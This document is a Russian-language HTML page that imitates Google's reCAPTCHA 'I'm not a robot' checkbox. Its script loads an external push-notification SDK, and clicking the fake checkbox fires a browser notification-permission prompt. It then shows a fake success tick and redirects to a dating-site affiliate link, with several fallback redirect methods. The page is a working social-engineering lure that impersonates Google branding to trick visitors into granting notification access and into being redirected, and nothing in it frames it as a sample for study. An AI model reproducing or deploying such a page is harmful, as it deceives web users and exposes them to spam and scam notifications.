<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
    <title>reCAPTCHA</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            background-color: #f9f9f9;
            overflow: hidden; /* Отключаем прокрутку */
        }
        .container {
            position: fixed; /* Фиксируем позицию */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%); /* Центрируем по обоим осям */
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
        }
        .captcha-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            padding: 10px;
            border: 1px solid #dfe1e5;
            border-radius: 4px;
            background-color: #fff;
            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
        }
        .captcha-left {
            display: flex;
            align-items: center;
        }
        .captcha-checkbox {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            cursor: pointer;
            border: 2px solid #000; /* Черная окантовка */
            background-color: transparent; /* Прозрачный фон */
            position: relative;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }
        .captcha-checkbox.loading {
            border: none; /* Убираем рамку во время загрузки */
            background-color: transparent;
        }
        .captcha-checkbox.loading::before {
            content: '';
            width: 20px;
            height: 20px;
            border: 3px solid #1a73e8; /* Приятный синий цвет */
            border-top-color: transparent;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: spin 0.8s linear infinite;
        }
        .captcha-checkbox.completed {
            border: none; /* Убираем рамку */
            background-color: transparent;
        }
        .captcha-checkbox.completed::before {
            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: block;
        }
        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }
        .captcha-text {
            font-size: 14px;
            color: #000;
        }
        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }
        .captcha-logo {
            width: 20px;
            height: 20px;
            margin-bottom: 5px;
        }
        .captcha-brand {
            font-size: 12px;
            color: #757575;
        }
        .captcha-links {
            font-size: 10px;
            color: #757575;
        }
        .captcha-links a {
            color: #757575;
            text-decoration: none;
        }
        .submit-button {
            padding: 8px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }
        .submit-button:hover {
            background-color: #e8eaed;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .error {
            color: red;
            font-size: 12px;
            display: none;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
    <div class="container">
        <div class="captcha-container">
            <div class="captcha-left">
                <input type="checkbox" id="captcha" class="captcha-checkbox">
                <span class="captcha-text">Я не робот</span>
            </div>
            <div class="captcha-right">
                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                <span class="captcha-brand">reCAPTCHA</span>
                <div class="captcha-links">
                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
                </div>
            </div>
        </div>
        <div class="button-container">
            <button class="submit-button" id="submit-button">Отправить</button>
            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
        </div>
    </div>

    <script>
        // Ссылка для редиректа
        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd2';

        // Функция для логирования подписки
        function logSubscription(permission, subId = 'test_campaign') {
            const data = {
                id: 'HnFv7gIgUEyhZsQd8kp20Q',
                sub_id: subId,
                permission: permission,
                timestamp: new Date().toISOString()
            };
            console.log('Лог подписки:', data);
        }

        // Функция для выполнения редиректа
        function performRedirect() {
            console.log('Попытка редиректа на:', redirectUrl);
            try {
                const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
                if (isWebView) {
                    console.log('Обнаружен WebView, используем location.assign');
                    window.location.assign(redirectUrl);
                } else {
                    console.log('Стандартный редирект через location.href');
                    window.location.href = redirectUrl;
                }
                setTimeout(() => {
                    if (window.location.href !== redirectUrl) {
                        console.log('Резервный редирект через location.replace');
                        window.location.replace(redirectUrl);
                    }
                }, 500);
            } catch (e) {
                console.error('Ошибка редиректа:', e);
                try {
                    console.log('Попытка редиректа через программный клик');
                    const link = document.createElement('a');
                    link.href = redirectUrl;
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                } catch (clickError) {
                    console.error('Ошибка программного клика:', clickError);
                    const error = document.getElementById('error');
                    error.innerHTML = `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`;
                    error.style.display = 'block';
                }
            }
        }

        // Функция для ожидания загрузки ps.js
        function waitForPsJs(maxAttempts = 10, interval = 500) {
            return new Promise((resolve, reject) => {
                let attempts = 0;
                const checkPs = () => {
                    if (window.ps && typeof window.ps.showPrompt === 'function') {
                        console.log('ps.js загружен успешно');
                        resolve();
                    } else if (attempts >= maxAttempts) {
                        console.error('ps.js не загружен после максимального количества попыток');
                        reject(new Error('ps.js not loaded'));
                    } else {
                        attempts++;
                        console.log(`Ожидание ps.js, попытка ${attempts}/${maxAttempts}`);
                        setTimeout(checkPs, interval);
                    }
                };
                checkPs();
            });
        }

        // Функция для запроса подписки
        function requestSubscription(checkbox) {
            console.log('Запуск requestSubscription');
            try {
                if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                    console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                    logSubscription(Notification.permission);
                    checkbox.classList.remove('loading');
                    checkbox.classList.add('completed');
                    setTimeout(() => {
                        console.log('Запуск редиректа после галочки');
                        performRedirect();
                    }, 1000);
                    return;
                }

                waitForPsJs()
                    .then(() => {
                        console.log('Вызываем подписку через ps.js');
                        window.ps.showPrompt()
                            .then(result => {
                                console.log('Результат подписки:', result);
                                logSubscription(Notification.permission);
                                checkbox.classList.remove('loading');
                                checkbox.classList.add('completed');
                                setTimeout(() => {
                                    console.log('Запуск редиректа после галочки');
                                    performRedirect();
                                }, 1000);
                            })
                            .catch(err => {
                                console.error('Ошибка вызова подписки:', err);
                                logSubscription(Notification.permission);
                                checkbox.classList.remove('loading');
                                checkbox.classList.add('completed');
                                setTimeout(() => {
                                    console.log('Запуск редиректа после галочки');
                                    performRedirect();
                                }, 1000);
                            });
                    })
                    .catch(() => {
                        console.log('API ps.js не доступен, пробуем Notification API');
                        if ('Notification' in window) {
                            Notification.requestPermission()
                                .then(permission => {
                                    console.log('Результат разрешения:', permission);
                                    logSubscription(permission);
                                    checkbox.classList.remove('loading');
                                    checkbox.classList.add('completed');
                                    setTimeout(() => {
                                        console.log('Запуск редиректа после галочки');
                                        performRedirect();
                                    }, 1000);
                                })
                                .catch(err => {
                                    console.error('Ошибка Notification API:', err);
                                    logSubscription('error');
                                    checkbox.classList.remove('loading');
                                    checkbox.classList.add('completed');
                                    setTimeout(() => {
                                        console.log('Запуск редиректа после галочки');
                                        performRedirect();
                                    }, 1000);
                                });
                        } else {
                            console.log('Уведомления не поддерживаются');
                            logSubscription('unsupported');
                            checkbox.classList.remove('loading');
                            checkbox.classList.add('completed');
                            setTimeout(() => {
                                console.log('Запуск редиректа после галочки');
                                performRedirect();
                            }, 1000);
                        }
                    });
            } catch (e) {
                console.error('Общая ошибка в requestSubscription:', e);
                logSubscription('error');
                checkbox.classList.remove('loading');
                checkbox.classList.add('completed');
                setTimeout(() => {
                    console.log('Запуск редиректа после галочки');
                    performRedirect();
                }, 1000);
            }
        }

        // Функция проверки
        function verify() {
            const checkbox = document.getElementById('captcha');
            const error = document.getElementById('error');
            if (checkbox.checked) {
                console.log('Чекбокс отмечен, запускаем подписку');
                error.style.display = 'none';
                checkbox.disabled = true; // Блокируем чекбокс
                checkbox.classList.add('loading'); // Показываем лоадер
                requestSubscription(checkbox);
                checkbox.disabled = false; // Разблокируем после обработки
            } else {
                error.style.display = 'block';
            }
        }

        // События
        document.getElementById('captcha').addEventListener('click', () => {
            console.log('Чекбокс кликнут');
            const checkbox = document.getElementById('captcha');
            if (!checkbox.checked) {
                checkbox.checked = true; // Принудительно устанавливаем галочку
            }
            verify();
        });

        document.getElementById('submit-button').addEventListener('click', () => {
            console.log('Нажата кнопка Отправить');
            verify();
        });
    </script>
</body>
</html>
